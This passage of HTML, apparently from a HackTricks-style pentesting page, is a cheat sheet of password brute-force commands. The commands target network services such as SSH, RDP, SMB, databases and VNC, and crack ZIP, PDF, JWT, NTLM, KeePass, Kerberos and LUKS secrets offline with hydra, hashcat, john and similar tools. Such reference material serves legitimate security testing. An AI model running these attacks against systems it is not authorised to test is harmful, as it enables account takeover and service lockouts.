+./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8
+
+#https://github.com/mazen160/jwt-pwn
+python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt
+
+#https://github.com/lmammino/jwt-cracker
+jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
+</code></pre>
+<h3 id="ldap"><a class="header" href="#ldap">LDAP</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">nmap --script ldap-brute -p 389 &lt;IP&gt;
+legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
+</code></pre>
+<h3 id="mqtt"><a class="header" href="#mqtt">MQTT</a></h3>
+<pre><code>ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
+legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
+</code></pre>
+<h3 id="mongo"><a class="header" href="#mongo">Mongo</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">nmap -sV --script mongodb-brute -n -p 27017 &lt;IP&gt;
+use auxiliary/scanner/mongodb/mongodb_login
+legba mongodb --target localhost:27017 --username root --password data/passwords.txt
+</code></pre>
+<h3 id="mssql"><a class="header" href="#mssql">MSSQL</a></h3>
+<p><a href="https://github.com/ScorpionesLabs/MSSqlPwner">MSSQLPwner</a></p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">shell</span></div>
+<pre><code class="language-shell"># Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt
+
+# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt
+
+# Bruteforce using tickets against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt
+
+# Bruteforce using passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
+
+# Bruteforce using hashes against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
+</code></pre>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
+</code></pre>
+<h3 id="mysql"><a class="header" href="#mysql">MySQL</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash"># hydra
+hydra -L usernames.txt -P pass.txt &lt;IP&gt; mysql
+
+# msfconsole
+msf&gt; use auxiliary/scanner/mysql/mysql_login; set VERBOSE false
+
+# medusa
+medusa -h &lt;IP/Host&gt; -u &lt;username&gt; -P &lt;password_list&gt; &lt;-f | to stop medusa on first success attempt&gt; -t &lt;threads&gt; -M mysql
+
+#Legba
+legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
+</code></pre>
+<h3 id="oraclesql"><a class="header" href="#oraclesql">OracleSQL</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">patator oracle_login sid=&lt;SID&gt; host=&lt;IP&gt; user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017
+
+./odat.py passwordguesser -s $SERVER -d $SID
+./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt
+
+#msf1
+msf&gt; use admin/oracle/oracle_login
+msf&gt; set RHOSTS &lt;IP&gt;
+msf&gt; set RPORT 1521
+msf&gt; set SID &lt;SID&gt;
+
+#msf2, this option uses nmap and it fails sometimes for some reason
+msf&gt; use scanner/oracle/oracle_login
+msf&gt; set RHOSTS &lt;IP&gt;
+msf&gt; set RPORTS 1521
+msf&gt; set SID &lt;SID&gt;
+
+#for some reason nmap fails sometimes when executing this script
+nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=&lt;SID&gt; &lt;IP&gt;
+
+legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
+</code></pre>
+<p>In order to use <strong>oracle_login</strong> with <strong>patator</strong> you need to <strong>install</strong>:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">pip3 install cx_Oracle --upgrade
+</code></pre>
+<p><a href="https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force">Offline OracleSQL hash bruteforce</a> (<strong>versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,</strong> and <strong>11.2.0.3</strong>):</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash"> nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
+</code></pre>
+<h3 id="pop"><a class="header" href="#pop">POP</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">hydra -l USERNAME -P /path/to/passwords.txt -f &lt;IP&gt; pop3 -V
+hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f &lt;IP&gt; pop3 -V
+
+# Insecure
+legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110
+
+# SSL
+legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
+</code></pre>
+<h3 id="postgresql"><a class="header" href="#postgresql">PostgreSQL</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt &lt;IP&gt; postgres
+medusa -h &lt;IP&gt; –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
+ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt &lt;IP&gt;:5432
+patator pgsql_login host=&lt;IP&gt; user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
+use auxiliary/scanner/postgres/postgres_login
+nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 &lt;IP&gt;
+legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
+</code></pre>
+<h3 id="pptp"><a class="header" href="#pptp">PPTP</a></h3>
+<p>You can download the <code>.deb</code> package to install from <a href="https://http.kali.org/pool/main/t/thc-pptp-bruter/">https://http.kali.org/pool/main/t/thc-pptp-bruter/</a></p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">sudo dpkg -i thc-pptp-bruter*.deb #Install the package
+cat rockyou.txt | thc-pptp-bruter –u &lt;Username&gt; &lt;IP&gt;
+</code></pre>
+<h3 id="rdp"><a class="header" href="#rdp">RDP</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">ncrack -vv --user &lt;User&gt; -P pwds.txt rdp://&lt;IP&gt;
+hydra -V -f -L &lt;userslist&gt; -P &lt;passwlist&gt; rdp://&lt;IP&gt;
+legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain &lt;RDP_DOMAIN&gt;] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
+</code></pre>
+<h3 id="redis"><a class="header" href="#redis">Redis</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">msf&gt; use auxiliary/scanner/redis/redis_login
+nmap --script redis-brute -p 6379 &lt;IP&gt;
+hydra –P /path/pass.txt redis://&lt;IP&gt;:&lt;PORT&gt; # 6379 is the default
+legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
+</code></pre>
+<h3 id="rexec"><a class="header" href="#rexec">Rexec</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">hydra -l &lt;username&gt; -P &lt;password_file&gt; rexec://&lt;Victim-IP&gt; -v -V
+</code></pre>
+<h3 id="rlogin"><a class="header" href="#rlogin">Rlogin</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">hydra -l &lt;username&gt; -P &lt;password_file&gt; rlogin://&lt;Victim-IP&gt; -v -V
+</code></pre>
+<h3 id="rsh"><a class="header" href="#rsh">Rsh</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">hydra -L &lt;Username_list&gt; rsh://&lt;Victim_IP&gt; -v -V
+</code></pre>
+<p><a href="http://pentestmonkey.net/tools/misc/rsh-grind">http://pentestmonkey.net/tools/misc/rsh-grind</a></p>
+<h3 id="rsync"><a class="header" href="#rsync">Rsync</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 &lt;IP&gt;
+</code></pre>
+<h3 id="rtsp"><a class="header" href="#rtsp">RTSP</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">hydra -l root -P passwords.txt &lt;IP&gt; rtsp
+</code></pre>
+<h3 id="sftp"><a class="header" href="#sftp">SFTP</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
+# Try keys from a folder
+legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
+</code></pre>
+<h3 id="snmp"><a class="header" href="#snmp">SNMP</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">msf&gt; use auxiliary/scanner/snmp/snmp_login
+nmap -sU --script snmp-brute &lt;target&gt; [--script-args snmp-brute.communitiesdb=&lt;wordlist&gt; ]
+onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt &lt;IP&gt;
+hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
+</code></pre>
+<h3 id="smb"><a class="header" href="#smb">SMB</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">nmap --script smb-brute -p 445 &lt;IP&gt;
+hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
+legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup &lt;SMB_WORKGROUP&gt;] [--smb-share &lt;SMB_SHARE&gt;]
+</code></pre>
+<h3 id="smtp"><a class="header" href="#smtp">SMTP</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">hydra -l &lt;username&gt; -P /path/to/passwords.txt &lt;IP&gt; smtp -V
+hydra -l &lt;username&gt; -P /path/to/passwords.txt -s 587 &lt;IP&gt; -S -v -V #Port 587 for SMTP with SSL
+legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism &lt;mech&gt;]
+</code></pre>
+<h3 id="socks"><a class="header" href="#socks">SOCKS</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 &lt;IP&gt;
+legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
+# With alternative address
+legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
+</code></pre>
+<h3 id="sql-server"><a class="header" href="#sql-server">SQL Server</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">#Use the NetBIOS name of the machine as domain
+crackmapexec mssql &lt;IP&gt; -d &lt;Domain Name&gt; -u usernames.txt -p passwords.txt
+hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt &lt;IP&gt; mssql
+medusa -h &lt;IP&gt; –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
+nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts &lt;host&gt; #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
+msf&gt; use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
+</code></pre>
+<h3 id="ssh"><a class="header" href="#ssh">SSH</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; ssh
+ncrack -p 22 --user root -P passwords.txt &lt;IP&gt; [-T 5]
+medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M ssh
+patator ssh_login host=&lt;ip&gt; port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
+legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
+# Try keys from a folder
+legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
+</code></pre>
+<h4 id="weak-ssh-keys--debian-predictable-prng"><a class="header" href="#weak-ssh-keys--debian-predictable-prng">Weak SSH keys / Debian predictable PRNG</a></h4>
+<p>Some systems have known flaws in the random seed used to generate cryptographic material. This can result in a dramatically reduced keyspace which can be bruteforced with tools such as <a href="https://github.com/snowdroppe/ssh-keybrute">snowdroppe/ssh-keybrute</a>. Pre-generated sets of weak keys are also available such as <a href="https://github.com/g0tmi1k/debian-ssh">g0tmi1k/debian-ssh</a>.</p>
+<h3 id="stomp-activemq-rabbitmq-hornetq-and-openmq"><a class="header" href="#stomp-activemq-rabbitmq-hornetq-and-openmq">STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)</a></h3>
+<p>The STOMP text protocol is a widely used messaging protocol that <strong>allows seamless communication and interaction with popular message queueing services</strong> such as RabbitMQ, ActiveMQ, HornetQ, and OpenMQ. It provides a standardized and efficient approach to exchange messages and perform various messaging operations.</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">legba stomp --target localhost:61613 --username admin --password data/passwords.txt
+</code></pre>
+<h3 id="telnet"><a class="header" href="#telnet">Telnet</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; telnet
+ncrack -p 23 --user root -P passwords.txt &lt;IP&gt; [-T 5]
+medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M telnet
+
+legba telnet \
+    --username admin \
+    --password wordlists/passwords.txt \
+    --target localhost:23 \
+    --telnet-user-prompt "login: " \
+    --telnet-pass-prompt "Password: " \
+    --telnet-prompt ":~$ " \
+    --single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
+</code></pre>
+<h3 id="vnc"><a class="header" href="#vnc">VNC</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s &lt;PORT&gt; &lt;IP&gt; vnc
+medusa -h &lt;IP&gt; –u root -P /root/Desktop/pass.txt –M vnc
+ncrack -V --user root -P /root/Desktop/pass.txt &lt;IP&gt;:&gt;POR&gt;T
+patator vnc_login host=&lt;IP&gt; password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
+use auxiliary/scanner/vnc/vnc_login
+nmap -p 5900,5901 --script vnc-brute --script-args brute.credfile=wordlist.txt &lt;IP&gt;
+legba vnc --target localhost:5901 --password data/passwords.txt
+
+#Metasploit
+use auxiliary/scanner/vnc/vnc_login
+set RHOSTS &lt;ip&gt;
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
+</code></pre>
+<h3 id="winrm"><a class="header" href="#winrm">Winrm</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">crackmapexec winrm &lt;IP&gt; -d &lt;Domain Name&gt; -u usernames.txt -p passwords.txt
+</code></pre>
+<h2 id="local"><a class="header" href="#local">Local</a></h2>
+<h3 id="online-cracking-databases"><a class="header" href="#online-cracking-databases">Online cracking databases</a></h3>
+<ul>
+<li><a href="http://hashtoolkit.com/reverse-hash?"><del>http://hashtoolkit.com/reverse-hash?</del></a> (MD5 &amp; SHA1)</li>
+<li><a href="https://shuck.sh/get-shucking.php">https://shuck.sh/get-shucking.php</a> (MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP and with any challenge's value)</li>
+<li><a href="https://www.onlinehashcrack.com">https://www.onlinehashcrack.com/</a> (Hashes, WPA2 captures, and archives MSOffice, ZIP, PDF...)</li>
+<li><a href="https://crackstation.net">https://crackstation.net/</a> (Hashes)</li>
+<li><a href="https://md5decrypt.net">https://md5decrypt.net/</a> (MD5)</li>
+<li><a href="https://gpuhash.me">https://gpuhash.me/</a> (Hashes and file hashes)</li>
+<li><a href="https://hashes.org/search.php">https://hashes.org/search.php</a> (Hashes)</li>
+<li><a href="https://www.cmd5.org">https://www.cmd5.org/</a> (Hashes)</li>
+<li><a href="https://hashkiller.co.uk/Cracker">https://hashkiller.co.uk/Cracker</a> (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)</li>
+<li><a href="https://www.md5online.org/md5-decrypt.html">https://www.md5online.org/md5-decrypt.html</a> (MD5)</li>
+<li><a href="http://reverse-hash-lookup.online-domain-tools.com">http://reverse-hash-lookup.online-domain-tools.com/</a></li>
+</ul>
+<p>Check this out before trying to brute force a Hash.</p>
+<h3 id="zip"><a class="header" href="#zip">ZIP</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">#sudo apt-get install fcrackzip
+fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
+</code></pre>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">zip2john file.zip &gt; zip.john
+john zip.john
+</code></pre>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
+hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
+.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
+</code></pre>
+<h4 id="known-plaintext-zip-attack"><a class="header" href="#known-plaintext-zip-attack">Known plaintext zip attack</a></h4>
+<p>You need to know the <strong>plaintext</strong> (or part of the plaintext) <strong>of a file contained inside</strong> the encrypted zip. You can check <strong>filenames and size of files contained inside</strong> an encrypted zip running: <strong><code>7z l encrypted.zip</code></strong><br />
+Download <a href="https://github.com/kimci86/bkcrack/releases/tag/v1.4.0"><strong>bkcrack</strong> </a>from the releases page.</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash"># You need to create a zip file containing only the file that is inside the encrypted zip
+zip plaintext.zip plaintext.file
+
+./bkcrack -C &lt;encrypted.zip&gt; -c &lt;plaintext.file&gt; -P &lt;plaintext.zip&gt; -p &lt;plaintext.file&gt;
+# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
+# With that key you can create a new zip file with the content of encrypted.zip
+# but with a different pass that you set (so you can decrypt it)
+./bkcrack -C &lt;encrypted.zip&gt; -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
+unzip unlocked.zip #User new_pwd as password
+</code></pre>
+<h3 id="7z"><a class="header" href="#7z">7z</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
+</code></pre>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">#Download and install requirements for 7z2john
+wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
+apt-get install libcompress-raw-lzma-perl
+./7z2john.pl file.7z &gt; 7zhash.john
+</code></pre>
+<h3 id="pdf"><a class="header" href="#pdf">PDF</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">apt-get install pdfcrack
+pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
+#pdf2john didn't work well, john didn't know which hash type was
+# To permanently decrypt the pdf
+sudo apt-get install qpdf
+qpdf --password=&lt;PASSWORD&gt; --decrypt encrypted.pdf plaintext.pdf
+</code></pre>
+<h3 id="pdf-owner-password"><a class="header" href="#pdf-owner-password">PDF Owner Password</a></h3>
+<p>To crack a PDF Owner password check this: <a href="https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/">https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/</a></p>
+<h3 id="jwt-1"><a class="header" href="#jwt-1">JWT</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">git clone https://github.com/Sjord/jwtcrack.git
+cd jwtcrack
+
+#Bruteforce using crackjwt.py
+python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt
+
+#Bruteforce using john
+python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc &gt; jwt.john
+john jwt.john #It does not work with Kali-John
+</code></pre>
+<h3 id="ntlm-cracking"><a class="header" href="#ntlm-cracking">NTLM cracking</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">Format:USUARIO:ID:HASH_LM:HASH_NT:::
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
+hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
+</code></pre>
+<h3 id="keepass"><a class="header" href="#keepass">Keepass</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">sudo apt-get install -y kpcli #Install keepass tools like keepass2john
+keepass2john file.kdbx &gt; hash #The keepass is only using password
+keepass2john -k &lt;file-password&gt; file.kdbx &gt; hash # The keepass is also using a file as a needed credential
+#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+</code></pre>
+<h3 id="keberoasting"><a class="header" href="#keberoasting">Keberoasting</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
+hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
+./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
+</code></pre>
+<h3 id="lucks-image"><a class="header" href="#lucks-image">Lucks image</a></h3>
+<h4 id="method-1"><a class="header" href="#method-1">Method 1</a></h4>
+<p>Install: <a href="https://github.com/glv2/bruteforce-luks">https://github.com/glv2/bruteforce-luks</a></p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">bruteforce-luks -f ./list.txt ./backup.img
+cryptsetup luksOpen backup.img mylucksopen
+ls /dev/mapper/ #You should find here the image mylucksopen
+mount /dev/mapper/mylucksopen /mnt
+</code></pre>
+<h4 id="method-2"><a class="header" href="#method-2">Method 2</a></h4>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
+dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
+hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
+cryptsetup luksOpen backup.img mylucksopen
+ls /dev/mapper/ #You should find here the image mylucksopen
+mount /dev/mapper/mylucksopen /mnt
+</code></pre>
+<p>Another Luks BF tutorial: <a href="http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1">http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1</a></p>
+<h3 id="mysql-1"><a class="header" href="#mysql-1">Mysql</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">#John hash format
+&lt;USERNAME&gt;:$mysqlna$&lt;CHALLENGE&gt;*&lt;RESPONSE&gt;
+dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
+</code></pre>
+<h3 id="pgpgpg-private-key"><a class="header" href="#pgpgpg-private-key">PGP/GPG Private key</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">gpg2john private_pgp.key #This will generate the hash and save it in a file
+john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
+</code></pre>
+<h3 id="cisco"><a class="header" href="#cisco">Cisco</a></h3>
+<figure><img src="../images/image (663).png" alt=""><figcaption></figcaption></figure>
+<h3 id="dpapi-master-key"><a class="header" href="#dpapi-master-key">DPAPI Master Key</a></h3>
+<p>Use <a href="https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py">https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py</a> and then john</p>
+<h3 id="open-office-pwd-protected-column"><a class="header" href="#open-office-pwd-protected-column">Open Office Pwd Protected Column</a></h3>
+<p>If you have an xlsx file with a column protected by a password you can unprotect it:</p>
+<ul>
+<li><strong>Upload it to google drive</strong> and the password will be automatically removed</li>
+<li>To <strong>remove</strong> it <strong>manually</strong>:</li>
+</ul>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">unzip file.xlsx
+grep -R "sheetProtection" ./*
+# Find something like: &lt;sheetProtection algorithmName="SHA-512"
+hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/&gt;
+# Remove that line and rezip the file
+zip -r file.xls .
+</code></pre>
+<h3 id="pfx-certificates"><a class="header" href="#pfx-certificates">PFX Certificates</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash"># From https://github.com/Ridter/p12tool
+./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
+# From https://github.com/crackpkcs12/crackpkcs12
+crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
+</code></pre>
+<h2 id="tools"><a class="header" href="#tools">Tools</a></h2>
+<p><strong>Hash examples:</strong> <a href="https://openwall.info/wiki/john/sample-hashes">https://openwall.info/wiki/john/sample-hashes</a></p>
+<h3 id="hash-identifier"><a class="header" href="#hash-identifier">Hash-identifier</a></h3>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">hash-identifier
+&gt; &lt;HASH&gt;
+</code></pre>
+<h3 id="wordlists-1"><a class="header" href="#wordlists-1">Wordlists</a></h3>
+<ul>
+<li><strong>Rockyou</strong></li>
+<li><a href="https://github.com/berzerk0/Probable-Wordlists"><strong>Probable-Wordlists</strong></a></li>
